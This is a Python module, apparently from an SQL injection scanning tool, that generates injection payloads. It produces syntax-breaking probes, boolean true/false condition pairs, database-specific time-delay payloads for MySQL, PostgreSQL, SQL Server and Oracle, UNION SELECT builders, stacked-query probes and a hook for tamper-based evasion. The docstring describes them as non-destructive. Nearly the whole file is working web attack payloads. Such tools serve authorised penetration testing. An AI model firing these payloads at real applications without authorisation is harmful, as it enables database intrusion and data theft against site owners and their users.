"""Payload generation for every supported SQL injection technique.

All payloads are non-destructive: they read data, raise database errors, cause controlled
delays, or reference tables that do not exist. There is no INSERT, UPDATE, DELETE or DDL
payload anywhere in this project.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

from models import Technique

_NUMERIC = re.compile(r"^-?\d+(?:\.\d+)?$")


@dataclass(frozen=True)
class Payload:
    value: str
    technique: Technique
    dbms: str | None
    context: str
    description: str = ""


@dataclass(frozen=True)
class BooleanPair:
    true_value: str
    false_value: str
    context: str
    dbms: str | None
    baseline_side: str = "true"
    description: str = ""

    def __post_init__(self) -> None:
        if self.baseline_side not in {"true", "false"}:
            raise ValueError("baseline_side must be 'true' or 'false'")


@dataclass(frozen=True)
class StackedPayload:
    value: str
    token: str | None
    context: str
    description: str


def looks_numeric(value: str) -> bool:
    return bool(_NUMERIC.match(value.strip()))


def _deduplicate(values: list[str]) -> list[str]:
    seen: set[str] = set()
    result: list[str] = []
    for value in values:
        if value not in seen:
            seen.add(value)
            result.append(value)
    return result


def error_payloads(original: str) -> list[Payload]:
    """Build payloads that are likely to break the surrounding SQL syntax."""
    values = [
        f"{original}'",
        f'{original}"',
        f"{original}\\",
        f"{original}')",
        f'{original}"))',
        f"{original}';",
        f"{original}'-- -",
        f'{original}"-- -',
        f"{original}'/*",
        f"{original}'))-- -",
        f"{original}')-- -",
        "'",
        '"',
        "\\",
        "1'",
        '1"',
        "1)",
        "1))",
        "1'-- -",
        "1 AND 1=1",
        "1 OR 1=1",
        "-1",
        "1e309",
    ]
    payloads: list[Payload] = []
    for value in _deduplicate(values):
        context = (
            "numeric" if looks_numeric(original) and not value.startswith(("'", '"')) else "string"
        )
        payloads.append(
            Payload(
                value=value,
                technique=Technique.ERROR,
                dbms=None,
                context=context,
                description="syntax-breaking probe",
            )
        )
    return payloads


def boolean_pairs(original: str) -> list[BooleanPair]:
    """Build true/false condition pairs for boolean-based blind detection.

    Pairs are ordered from the most common contexts to the least common ones. The detector
    stops after two independent confirmations, so a typical vulnerable point needs only four
    or five requests.
    """
    pairs: list[BooleanPair] = []
    single = [
        (
            f"{original}%' AND '1'='1'-- -",
            f"{original}%' AND '1'='2'-- -",
            "single-quote",
            "true",
            "wildcard-preserving single-quote condition",
        ),
        (
            f"{original}' AND '1'='1'-- -",
            f"{original}' AND '1'='2'-- -",
            "single-quote",
            "true",
            "single-quote condition",
        ),
        (
            f"{original}' AND 2=2-- -",
            f"{original}' AND 2=3-- -",
            "single-quote",
            "true",
            "single-quote numeric condition",
        ),
        (
            f"{original}' AND 'a'='a'-- -",
            f"{original}' AND 'a'='b'-- -",
            "single-quote",
            "true",
            "single-quote string comparison",
        ),
        (
            f"{original}' AND 1 LIKE 1-- -",
            f"{original}' AND 1 LIKE 2-- -",
            "single-quote",
            "true",
            "single-quote LIKE condition",
        ),
        (
            f"{original}' AND '1'='1'#",
            f"{original}' AND '1'='2'#",
            "single-quote",
            "true",
            "single-quote condition with hash comment",
        ),
        (
            f"{original}' AND '1'='1'/*",
            f"{original}' AND '1'='2'/*",
            "single-quote",
            "true",
            "single-quote condition with block comment",
        ),
        (
            f"{original}' OR '1'='1'-- -",
            f"{original}' OR '1'='2'-- -",
            "single-quote",
            "false",
            "single-quote OR condition",
        ),
        (
            f"{original}' OR 2=2-- -",
            f"{original}' OR 2=3-- -",
            "single-quote",
            "false",
            "single-quote OR numeric condition",
        ),
        (
            f"{original}' OR 'a'='a'-- -",
            f"{original}' OR 'a'='b'-- -",
            "single-quote",
            "false",
            "single-quote OR string comparison",
        ),
        (
            f"{original}' OR 1=1#",
            f"{original}' OR 1=2#",
            "single-quote",
            "false",
            "single-quote OR condition with hash comment",
        ),
    ]
    for true_value, false_value, context, side, description in single:
        pairs.append(
            BooleanPair(
                true_value=true_value,
                false_value=false_value,
                context=context,
                dbms="MySQL/MariaDB" if "#" in true_value else None,
                baseline_side=side,
                description=description,
            )
        )
    pairs.append(
        BooleanPair(
            true_value=f'{original}" AND "1"="1"-- -',
            false_value=f'{original}" AND "1"="2"-- -',
            context="double-quote",
            dbms=None,
            description="double-quote condition",
        )
    )
    pairs.append(
        BooleanPair(
            true_value=f'{original}" AND 1=1-- -',
            false_value=f'{original}" AND 1=2-- -',
            context="double-quote",
            dbms=None,
            description="double-quote numeric condition",
        )
    )
    pairs.append(
        BooleanPair(
            true_value=f"{original}') AND ('1'='1')-- -",
            false_value=f"{original}') AND ('1'='2')-- -",
            context="parenthesis",
            dbms=None,
            description="parenthesised single-quote condition",
        )
    )
    pairs.append(
        BooleanPair(
            true_value=f"{original}') AND 1=1-- -",
            false_value=f"{original}') AND 1=2-- -",
            context="parenthesis",
            dbms=None,
            description="parenthesised numeric condition",
        )
    )
    pairs.append(
        BooleanPair(
            true_value=f'{original}" OR "1"="1"-- -',
            false_value=f'{original}" OR "1"="2"-- -',
            context="double-quote",
            dbms=None,
            baseline_side="false",
            description="double-quote OR condition",
        )
    )
    numeric = [
        (
            f"{original} AND 1=1-- -",
            f"{original} AND 1=2-- -",
            "numeric",
            "true",
        ),
        (
            f"{original} AND 2=2-- -",
            f"{original} AND 2=3-- -",
            "numeric",
            "true",
        ),
        (
            f"{original} AND 1 LIKE 1-- -",
            f"{original} AND 1 LIKE 2-- -",
            "numeric",
            "true",
        ),
        (
            f"{original} OR 1=1-- -",
            f"{original} OR 1=2-- -",
            "numeric",
            "false",
        ),
        (
            f"{original} OR 2=2-- -",
            f"{original} OR 2=3-- -",
            "numeric",
            "false",
        ),
        (
            f"{original} AND 1=1#",
            f"{original} AND 1=2#",
            "numeric",
            "true",
        ),
    ]
    for true_value, false_value, context, side in numeric:
        pairs.append(
            BooleanPair(
                true_value=true_value,
                false_value=false_value,
                context=context,
                dbms="MySQL/MariaDB" if "#" in true_value else None,
                baseline_side=side,
                description="numeric condition",
            )
        )
    unique: list[BooleanPair] = []
    seen: set[tuple[str, str]] = set()
    for pair in pairs:
        key = (pair.true_value, pair.false_value)
        if key not in seen:
            seen.add(key)
            unique.append(pair)
    return unique


def _format_delay(delay: float) -> str:
    return f"{delay:.2f}".rstrip("0").rstrip(".")


def _mssql_delay(delay: float) -> str:
    seconds = max(1, int(round(delay)))
    return f"0:0:{seconds}"


def time_payloads(original: str, delay: float) -> list[Payload]:
    """Build database-specific delay payloads ordered by expected portability."""
    if delay <= 0:
        raise ValueError("delay must be positive")
    mysql_delay = _format_delay(delay)
    mssql_delay = _mssql_delay(delay)
    values: list[tuple[str, str, str, str]] = [
        (f"{original}' AND SLEEP({mysql_delay})-- -", "MySQL/MariaDB", "single-quote", "SLEEP"),
        (f"{original}' OR SLEEP({mysql_delay})-- -", "MySQL/MariaDB", "single-quote", "SLEEP OR"),
        (f"{original} AND SLEEP({mysql_delay})-- -", "MySQL/MariaDB", "numeric", "SLEEP"),
        (f"{original}') AND SLEEP({mysql_delay})-- -", "MySQL/MariaDB", "parenthesis", "SLEEP"),
        (f'{original}" AND SLEEP({mysql_delay})-- -', "MySQL/MariaDB", "double-quote", "SLEEP"),
        (
            f"{original}' AND 1=(SELECT 1 FROM pg_sleep({mysql_delay}))-- -",
            "PostgreSQL",
            "single-quote",
            "pg_sleep subquery",
        ),
        (
            f"{original}' AND pg_sleep({mysql_delay}) IS NULL-- -",
            "PostgreSQL",
            "single-quote",
            "pg_sleep",
        ),
        (
            f"{original}; SELECT pg_sleep({mysql_delay})-- -",
            "PostgreSQL",
            "numeric",
            "stacked pg_sleep",
        ),
        (
            f"{original}'; SELECT pg_sleep({mysql_delay})-- -",
            "PostgreSQL",
            "single-quote",
            "stacked pg_sleep",
        ),
        (
            f"{original}'; WAITFOR DELAY '0:0:{mssql_delay.split(':')[-1]}'-- -",
            "Microsoft SQL Server",
            "single-quote",
            "WAITFOR DELAY",
        ),
        (
            f"{original}; WAITFOR DELAY '0:0:{mssql_delay.split(':')[-1]}'-- -",
            "Microsoft SQL Server",
            "numeric",
            "WAITFOR DELAY",
        ),
        (
            f"{original}') ; WAITFOR DELAY '0:0:{mssql_delay.split(':')[-1]}'-- -",
            "Microsoft SQL Server",
            "parenthesis",
            "WAITFOR DELAY",
        ),
        (
            f"{original}' AND 1=dbms_pipe.receive_message(('a'),{mysql_delay})-- -",
            "Oracle",
            "single-quote",
            "dbms_pipe.receive_message",
        ),
        (
            f"{original} AND 1=dbms_pipe.receive_message(('a'),{mysql_delay})-- -",
            "Oracle",
            "numeric",
            "dbms_pipe.receive_message",
        ),
    ]
    result: list[Payload] = []
    seen: set[str] = set()
    for value, dbms, context, description in values:
        if value in seen:
            continue
        seen.add(value)
        result.append(
            Payload(
                value=value,
                technique=Technique.TIME,
                dbms=dbms,
                context=context,
                description=description,
            )
        )
    return result


@dataclass(frozen=True)
class UnionContext:
    closing: str
    context: str
    use_from_dual: bool = False


def union_contexts(original: str) -> list[UnionContext]:
    contexts: list[UnionContext] = []
    if looks_numeric(original):
        contexts.append(UnionContext(closing="", context="numeric"))
    contexts.extend(
        [
            UnionContext(closing="'", context="single-quote"),
            UnionContext(closing='"', context="double-quote"),
            UnionContext(closing="')", context="parenthesis"),
            UnionContext(closing="'", context="single-quote", use_from_dual=True),
        ]
    )
    unique: list[UnionContext] = []
    seen: set[tuple[str, bool]] = set()
    for context in contexts:
        key = (context.closing, context.use_from_dual)
        if key not in seen:
            seen.add(key)
            unique.append(context)
    return unique


def union_payload(
    original: str,
    context: UnionContext,
    columns: list[str],
    comment: str = "-- -",
    union_all: bool = False,
) -> str:
    operator = "UNION ALL SELECT" if union_all else "UNION SELECT"
    suffix = " FROM dual" if context.use_from_dual else ""
    return f"{original}{context.closing} {operator} {', '.join(columns)}{suffix}{comment}"


def numeric_marker_expression(marker: int) -> str:
    """Return an expression that evaluates to ``marker``.

    The marker itself is deliberately absent from the request. If a page reflects the payload,
    the expression is reflected, not the evaluated value, so reflection cannot create a false
    positive.
    """
    if marker <= 1:
        raise ValueError("marker must be greater than one")
    return f"({marker - 1})+1"


def stacked_payloads(original: str, token: str) -> list[StackedPayload]:
    """Build stacked-query probes that only read or raise controlled errors."""
    values = [
        (f"{original}'; SELECT * FROM {token}-- -", token, "single-quote", "second SELECT"),
        (f'{original}"; SELECT * FROM {token}-- -', token, "double-quote", "second SELECT"),
        (f"{original}'); SELECT * FROM {token}-- -", token, "parenthesis", "second SELECT"),
        (f"{original}; SELECT * FROM {token}-- -", token, "numeric", "second SELECT"),
        (f"{original}'; SELECT 1/0-- -", None, "single-quote", "division by zero"),
        (f"{original}; SELECT 1/0-- -", None, "numeric", "division by zero"),
    ]
    result: list[StackedPayload] = []
    seen: set[str] = set()
    for value, value_token, context, description in values:
        if value in seen:
            continue
        seen.add(value)
        result.append(
            StackedPayload(
                value=value,
                token=value_token,
                context=context,
                description=description,
            )
        )
    return result


def apply_tamper(value: str, strategies: tuple[str, ...]) -> str:
    from tamper import apply_tampers

    return apply_tampers(value, strategies) if strategies else value
